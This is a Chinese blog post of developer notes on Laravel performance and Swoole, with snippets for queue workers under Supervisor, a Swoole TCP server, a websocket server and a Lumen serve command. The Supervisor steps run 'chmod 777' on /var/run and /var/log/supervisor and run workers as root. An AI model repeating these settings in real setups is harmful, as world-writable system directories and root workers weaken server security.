<p><a href="https://github.com/guanguans/soar-php" target="_blank" rel="noopener">SQL 语句优化器和重写器的 PHP 扩展包</a></p>
<p><a href="https://github.com/yiranzai/php-tools" target="_blank" rel="noopener">不一样的PHP工具类</a></p>
<p><a href="https://geixue.com/" target="_blank" rel="noopener">php视频网站</a></p>
<p><a href="https://learnku.com/articles/25865" target="_blank" rel="noopener">画江湖之算法篇</a></p>
<p><a href="https://github.com/zzjzz9266a/91porn_php" target="_blank" rel="noopener">91porn爬虫php版本</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/10/laravel-swoole/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/10/laravel-swoole/" itemprop="url">laravel swoole</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-10T15:03:09+08:00">
                2018-12-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  3.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  14 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="laravel-响应慢"><a href="#laravel-响应慢" class="headerlink" title="laravel 响应慢"></a>laravel 响应慢</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//laravel-china.org/topics/2550/the-speed-of-laravel-5-is-indeed-a-bit-slow-here-are-the-results-of-the-oneapm-test</span></span><br><span class="line">https:<span class="comment">//laravel-china.org/topics/3583/laravel-performance-has-always-been-difficult-to-let-go-seek-guidance</span></span><br><span class="line">项目的可维护性，是相对更加重要的。用框架损耗一点性能，来换取开发效率、可维护性是值得。至于优化性能，手段很多，一般找到性能瓶颈对其优化即可，而性能瓶颈一般不会是在框架上。</span><br><span class="line">比如：用 Laravel 比用XX框架，框架多消耗了 <span class="number">50</span>ms。但是你发现流量上来后，瓶颈是在 IO 上（比如数据库，服务器硬盘，网络 IO）。假如可能是 mysql 数据库查询就慢了 <span class="number">1</span>s。这时候要引入缓存，就可以解决该阶段的问题。在实施方案时，发现用XX框架加缓存，代码写得乱七八糟，漏洞百出。而用 Laravel，花了很短的时间和精力就上了缓存功能，并且代码优雅，结构清晰，易于维护。</span><br><span class="line">那么，框架的优势就体现了。</span><br><span class="line"></span><br><span class="line">不要轻易、任性、随意添加各种各样的 package ，特别是需要添加 provicder 的那种，捡最需要的来。</span><br><span class="line">模型的 Observer 多的话，确实会影响框架启动速度，当前的项目有二三十个，影响<span class="number">10</span>~<span class="number">40</span>ms的启动速度（服务器配置不一样，影响不一样），这个没办法处理了。</span><br><span class="line">上面这两条是我的项目确实存在的问题，并且确实对哪怕一个 hello world 的简单输出也要有影响，但是很难处理掉的。</span><br><span class="line"></span><br><span class="line">其他的挺好的，laravel 对我们的项目的进度和开发的质量真的相比其它框架提高了很多。并且线上的 <span class="number">8</span>核<span class="number">16</span>G OPCache，影响不太大，项目现在有<span class="number">100</span>多个表，业务密集型的应用，速度满足我们的需要，大部分页面和接口 <span class="number">200</span>ms 以内。</span><br><span class="line"></span><br><span class="line">最后，SQL 一定要处理好，这个可能永远是你们项目性能最大的瓶颈。</span><br><span class="line"></span><br><span class="line">Laravel 的确是一个高效且优雅的框架，作为其重度使用者的我也觉得这个框架已经被神话了。如果你有足够的时间且理解你所开发的项目，真心推荐使用 Laravel 作为项目开发框架。但是，如果，就像我说的，如果你对项目做不到知根知底、PHP 基础不扎实、周期紧张、项目影响大，所有综合因素来判定后，慎重决定。如果你真的很希望使用且愿意为后果买单，像我这样愿意深入学习其优秀特性、思想，仔细阅读文档、源码，做到举一反三甚至能做到任意改造且升级自如，那么，你还会提出这种问题吗？</span><br><span class="line">php7 用了吗</span><br><span class="line">opcache 开了吗</span><br><span class="line">optimaize 了吗</span><br><span class="line">最有用的是 php7 opcache 然后 gzip </span><br><span class="line"></span><br><span class="line">先说内存的事，Java 和 Go 都有成熟的 GC，除非你开着全局变量并且一直往里塞东西，否则泄露不了内存，每个请求的 handler 是个闭包或者函数，只要不故意定义超过函数生命周期的变量，你不玩 off-heap 黑魔法，完全不会泄露内存。</span><br><span class="line"></span><br><span class="line">部署的话，php 和 python 差不多，比起 Java 和 Go 麻烦太多了，Go 最简单，就一个可执行文件，大部分情况下也不依赖什么运行库。Java 比起 go 稍微麻烦一点，就是需要先安装一个 JRE，然后也是一个 jar 包直接运行(现代 javaweb 一般内置了 tomcat 这类 webserver)，复杂一点就是把 war 扔到 tomcat 的 webapps 目录，它会自动重启。</span><br><span class="line"></span><br><span class="line">php 和 python 就麻烦很多了，用 pip/pear 安装扩展的时候经常会遇到 xxx.h 找不到，典型的比如 db 驱动。然后还必须前置一个 nginx 或者 apache，fastcgi 配起来还麻烦，不同框架配置方法不一样，还要提防 cgi 的 fixpath 问题。python 稍微好一些，uwsgi 比较简单，或者直接走 http 协议更简单。Java 和 Go 的最简单，把 <span class="keyword">static</span> 资源外的直接 proxy_pass 走就行了。</span><br><span class="line">PHP 光是把环境搭一遍都很麻烦。</span><br><span class="line"></span><br><span class="line">php7<span class="number">.1</span> 开始内置代码的 cache 了，改 php 文件是没用的，改完文件得重启 fpm 进程才能生效，这个应该是性能增强带来的副作用。在需要重启服务以后，php 的新版本手动部署，已经跟 java 或者 go 没有不同了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如果是关联数组：数组转对象可以直接用(object)()；对象转数组则要用get_object_vars()；</span><br><span class="line"></span><br><span class="line">如果是索引数组：数组转对象可以直接用(object)()；对象转数组直接用(array)()；</span><br><span class="line"></span><br><span class="line">觉得 php 部署简单的，我提个前几年遇到过好几次的场景，看看大家有没有好办法。</span><br><span class="line"></span><br><span class="line">几台服务器，无外网连接，系统有 rhel5 和 rhel6，还有 ubuntu12 和 <span class="number">14</span>，还有 windows <span class="number">32</span> 位和 <span class="number">64</span> 位都有，用到的数据库是 pgsql 和 db2，如何打包 php 程序过去部署？</span><br><span class="line"></span><br><span class="line">当时我的解法是，Java 给每个平台下载一个 JRE，应用打成 jar 包就好了，db 驱动也是 java 实现的，直接打进 jar 包里了，不依赖运行库。php 真的难倒了我，最后，我给每个平台下载了对应版本的 vmware，然后为 php 制作了虚拟机镜像，把兼容性工作交给了 vmware 去做。还好那些机器都有图形界面和 root 帐号，不然还得折腾无 gui 甚至无 root 的情况下怎么安装 vmware。</span><br><span class="line">http:<span class="comment">//php.net/manual/en/intro.opcache.php </span></span><br><span class="line"></span><br><span class="line">Laravel 慢不是什么地方出瓶颈了，而是 Laravel 这个框架本身就是瓶颈。</span><br><span class="line">优化点：</span><br><span class="line"><span class="number">1.</span> 重构 router，特别是你的路由比较多的时候，foreach 之后还要正则就是找不痛快；</span><br><span class="line"><span class="number">2.</span> 用 swoole 服务模式把需要重复初始化的地方抹平，只初始化一次，不过这个会进入普通 php 程序员不熟悉的领域，而且大部分业务逻辑以及第三方组件需要修改以适应服务模式；</span><br><span class="line"><span class="number">3.</span> 放弃 Laravel</span><br><span class="line">我用 lumen + php <span class="number">7.1</span> 测过，Laravel 的 echo time();</span><br><span class="line">在 i5 的机器上，<span class="number">2</span> 个路由的时候，QPS 能跑 <span class="number">5000</span> 左右。</span><br><span class="line">路由数量 <span class="number">100</span> 的时候，QPS 下降到 <span class="number">4000</span> 左右。</span><br><span class="line">路由数量 <span class="number">1000</span> 的时候，QPS 下降到 <span class="number">1100</span>+。</span><br><span class="line">如果用了 <span class="number">1000</span> 个正则做路由，我相信还会更慢。</span><br><span class="line"></span><br><span class="line">当我用 <span class="number">100</span> 路由，再开启 session 的时候，QPS 从 <span class="number">4000</span> 左右跌到了 <span class="number">1500</span>+，腰斩了有没有？随便再引入几条正则路由，再开几个 Middleware，那 QPS 估计就跟楼主那个一样了。</span><br></pre></td></tr></table></figure>
<h3 id="修改器"><a href="#修改器" class="headerlink" title="修改器"></a>修改器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Models;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line">use Carbon\Carbon;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $table = <span class="string">'baby'</span>;</span><br><span class="line">    protected $appends = [<span class="string">'age'</span>];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getAgeAttribute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $date = <span class="keyword">new</span> Carbon($<span class="keyword">this</span>-&gt;birthday);</span><br><span class="line">        <span class="keyword">return</span> Carbon::now()-&gt;diffInYears($date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $baby-&gt;age;<span class="comment">//得到几岁 https://laravel-china.org/articles/21982</span></span><br></pre></td></tr></table></figure>
<h3 id="Supervisor-管理-Laravel-队列"><a href="#Supervisor-管理-Laravel-队列" class="headerlink" title="Supervisor 管理 Laravel 队列"></a>Supervisor 管理 Laravel 队列</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br><span class="line">echo_supervisord_conf</span><br><span class="line">echo_supervisord_conf &gt; <span class="regexp">/etc/</span>supervisord.conf</span><br><span class="line">默认配置文件中的supervisord.sock、supervisord.log以及supervisord.pid是放在/tmp目录下，这个目录存放的是Linux中的临时文件，一旦被系统删除，就会提示unix:<span class="comment">///tmp/supervisor.sock no such file，所以我们要把这三个文件放到其他目录中保存。</span></span><br><span class="line">sudo chmod <span class="number">777</span> /<span class="keyword">var</span>/run</span><br><span class="line">sudo chmod <span class="number">777</span> /<span class="keyword">var</span>/log/supervisor</span><br><span class="line">supervisord -c /etc/supervisord.conf</span><br><span class="line">pgrep supervisord | xargs ps -u --pid</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root     <span class="number">13744</span>  <span class="number">0.0</span>  <span class="number">1.7</span> <span class="number">226320</span> <span class="number">17460</span> ?        Ss   <span class="number">1</span>月<span class="number">12</span>   <span class="number">0</span>:<span class="number">08</span> /bin/python /usr/bin/supervisord -c /etc/supervi</span><br><span class="line"></span><br><span class="line">[program:larashop-worker]  ;项目名称</span><br><span class="line">process_name=%(program_name)s_%(process_num)<span class="number">02</span>d</span><br><span class="line">command=php (填入你的artisan路径)/artisan queue:work redis --sleep=<span class="number">3</span> --tries=<span class="number">3</span>  ;需要启动的命令</span><br><span class="line">autostart=<span class="literal">true</span></span><br><span class="line">autorestart=<span class="literal">true</span></span><br><span class="line">user=root ;此处填入你运行WEB应用的用户</span><br><span class="line">numprocs=<span class="number">8</span>  ;进程数</span><br><span class="line">redirect_stderr=<span class="literal">true</span>  ;把 stderr 重定向到 stdout，默认 <span class="literal">false</span></span><br><span class="line">stdout_logfile=<span class="regexp">/var/</span>log/supervisor/larashop-queue.log  ;注意分配好日志文件夹权限</span><br><span class="line">supervisorctl reread  # 读取有更新（增加）的配置文件，不会启动新添加的程序</span><br><span class="line"></span><br><span class="line">supervisorctl update # 重启配置文件修改过的程序</span><br><span class="line"></span><br><span class="line">supervisorctl start larashop-worker:* # 启动 larashop-worker 程序</span><br><span class="line">supervisorctl status # 查看状态 如果在Laravel中修改了队列代码，需要重启Supervisor才能生效</span><br></pre></td></tr></table></figure>
<h3 id="Swoole-与-Laravel-结合使用"><a href="#Swoole-与-Laravel-结合使用" class="headerlink" title="Swoole 与 Laravel 结合使用"></a>Swoole 与 Laravel 结合使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">修改php.ini，增加swoole.use_namespace=On开启。使用命名空间类名后，旧式的下划线风格类名将不可用。</span><br><span class="line">namespace App\Console\Commands;</span><br><span class="line"></span><br><span class="line">use Illuminate\Console\Command;</span><br><span class="line">use App\Repositories\PushRepository;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Push</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $signature = <span class="string">'push:start'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $description = <span class="string">'推送服务启动命令'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * push处理推送任务的对象实例</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    protected $_repPush;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new command instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  DripEmailer  $drip</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">PushRepository $repPush</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;_repPush = $repPush;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;_repPush-&gt;start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 消息推送服务</span></span><br><span class="line"><span class="comment">  * @author: KongSeng &lt;643828892@qq.com&gt;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> namespace App\Repositories;</span><br><span class="line"> use \Swoole\Server;</span><br><span class="line"> use Config;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">PushRepository</span> <span class="keyword">extends</span> <span class="title">BaseRepository</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Swoole Server 服务</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   private $__serv = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 构造函数</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     $<span class="keyword">this</span>-&gt;__initSwoole();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 初始化swoole</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   private <span class="function"><span class="keyword">function</span> <span class="title">__initSwoole</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     $host = Config::get(<span class="string">'swoole.host'</span>);</span><br><span class="line">     $port = Config::get(<span class="string">'swoole.port'</span>);</span><br><span class="line">     $setConf = Config::get(<span class="string">'swoole.set'</span>);</span><br><span class="line"> </span><br><span class="line">     $<span class="keyword">this</span>-&gt;__serv = <span class="keyword">new</span> Server($host,$port);</span><br><span class="line">     $<span class="keyword">this</span>-&gt;__serv-&gt;set($setConf);</span><br><span class="line"> </span><br><span class="line">     $<span class="keyword">this</span>-&gt;__serv-&gt;on(<span class="string">'receive'</span>, array($<span class="keyword">this</span>,<span class="string">'onReceive'</span>));</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 数据接收回调</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">onReceive</span>(<span class="params">$serv, $fd, $from_id, $data</span>)</span>&#123;</span><br><span class="line">     $serv-&gt;send($fd,$data.<span class="string">"\r\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 开启服务https://laravel-china.org/articles/22712</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     $<span class="keyword">this</span>-&gt;__serv-&gt;start();</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> php artisan push:start</span><br></pre></td></tr></table></figure>
<h3 id="Websocket-服务中使用-Swoole"><a href="#Websocket-服务中使用-Swoole" class="headerlink" title="Websocket 服务中使用 Swoole"></a>Websocket 服务中使用 Swoole</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$server = <span class="keyword">new</span> swoole_websocket_server(<span class="string">'php'</span>, <span class="number">9501</span>);</span><br><span class="line">$server-&gt;on(<span class="string">'start'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">"Server has been started!\n"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$server-&gt;on(<span class="string">'open'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $request</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">"websocket: new connection, id: &#123;$request-&gt;fd&#125;\n"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$server-&gt;on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $frame</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">"websocket: &#123;$frame-&gt;fd&#125;:&#123;$frame-&gt;data&#125;,opcode:&#123;$frame-&gt;opcode&#125;,fin:&#123;$frame-&gt;finish&#125;\n"</span>;</span><br><span class="line">    $server-&gt;push($frame-&gt;fd, <span class="string">"Replying, you sent "</span> . $frame-&gt;data);</span><br><span class="line">&#125;);</span><br><span class="line">$server-&gt;on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $fd</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">"websocket: connection with id &#123;$fd&#125; has been closed\n"</span>;</span><br><span class="line">&#125;);</span><br><span class="line">$server-&gt;start();</span><br></pre></td></tr></table></figure>
<h3 id="Lumen-5-2-手动补回-artisan-serve-指令"><a href="#Lumen-5-2-手动补回-artisan-serve-指令" class="headerlink" title="Lumen 5.2 手动补回 artisan serve 指令"></a>Lumen 5.2 手动补回 artisan serve 指令</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Lumen <span class="number">5.2</span> 版本之前，通过php artisan serve指令即可快速启动调试</span><br><span class="line">https:<span class="comment">//blog.gxxsite.com/lumen-php-artisan-serve-local-debug-solution/</span></span><br><span class="line">Lumen <span class="number">5.2</span> 简化了 artisan，把serve精简掉了，用以下代码可以快速启动：</span><br><span class="line"></span><br><span class="line">php -S localhost:<span class="number">8080</span> -t ./public</span><br><span class="line">但是习惯了还是 serve 顺手吧，补充的方法如下：</span><br><span class="line"></span><br><span class="line">通过composer安装lumen-artisan-serve：</span><br><span class="line"></span><br><span class="line"> composer <span class="built_in">require</span> mlntn/lumen-artisan-serve <span class="string">"~1"</span></span><br><span class="line">修改app/Console/Kernel.php文件扩展artisan命令</span><br><span class="line"></span><br><span class="line"> protected $commands = [</span><br><span class="line">     \Mlntn\Console\Commands\Serve::<span class="class"><span class="keyword">class</span></span></span><br><span class="line"> ];</span><br><span class="line">至此，serve指令又能用了：</span><br><span class="line"></span><br><span class="line">php artisan serve --port=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-频繁出错-Packets-out-of-order-Expected-1-received-111-Packet-size"><a href="#MySQL-频繁出错-Packets-out-of-order-Expected-1-received-111-Packet-size" class="headerlink" title="MySQL 频繁出错 Packets out of order. Expected 1 received 111. Packet size"></a>MySQL 频繁出错 Packets out of order. Expected 1 received 111. Packet size</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在swoole start函数前创建了mysql连接, 那么后续所有的worker以及task多个子进程都是使用一开始主进程的这个数据库连接。如果有多个子进程同时使用该连接与数据库通信(进程切换)，那么就可能因为通信协议时序的不正确导致mysql出现异常。</span><br><span class="line">解决方案:</span><br><span class="line"></span><br><span class="line">在swoole start函数前注销mysql连接, <span class="attr">DB</span>::disconnect();</span><br><span class="line">相关文章:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>Server中对象的<span class="number">4</span>层生命周期 https:<span class="comment">//wiki.swoole.com/wiki/page/354.html</span></span><br><span class="line"><span class="number">2.</span>是否可以共用<span class="number">1</span>个redis或mysql连接 https:<span class="comment">//wiki.swoole.com/wiki/page/325.html</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/28953</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/kcloze/swoole-bot" target="_blank" rel="noopener">基于swoole实现的微信机器人</a></p>
<p><a href="https://learnku.com/articles/28112#topnav" target="_blank" rel="noopener"> swoole 协程之旅</a></p>
<p><a href="https://github.com/wi1dcard/laravel-deployment" target="_blank" rel="noopener">轻松部署 Laravel 应用</a></p>
<p><a href="https://github.com/summerblue/laravel-tutorial" target="_blank" rel="noopener">《Laravel 入门教程》</a></p>
<p><a href="https://learnku.com/laravel/t/22245" target="_blank" rel="noopener">Swoole 是 PHP 中的 Node.js</a></p>
<p><a href="https://laravel-china.org/articles/19945#a44a83" target="_blank" rel="noopener">-从生命周期看 Dingo API 是如何接管 Laravel 路由的</a></p>
<p><a href="https://laravel-china.org/articles/22321#e655a4" target="_blank" rel="noopener">配置 Supervisor 管理 Laravel 队列</a></p>
<p><a href="https://learnku.com/articles/28112" target="_blank" rel="noopener">swoole 协程之旅</a></p>
<p><a href="https://www.goozp.com/article/64.html" target="_blank" rel="noopener">workerman实现服务间通讯</a></p>
<p><a href="https://laravel-china.org/articles/7038/laravel-queue-source-analysis-of-message-queue-task-processor#efa8e7" target="_blank" rel="noopener">Laravel Queue——消息队列任务处理器源码剖析</a></p>
<p><a href="https://laravel-china.org/articles/20802#5db9fd" target="_blank" rel="noopener">Laravel 源码阅读之二：Illuminate\Foundation\Application 类初始化分析</a></p>
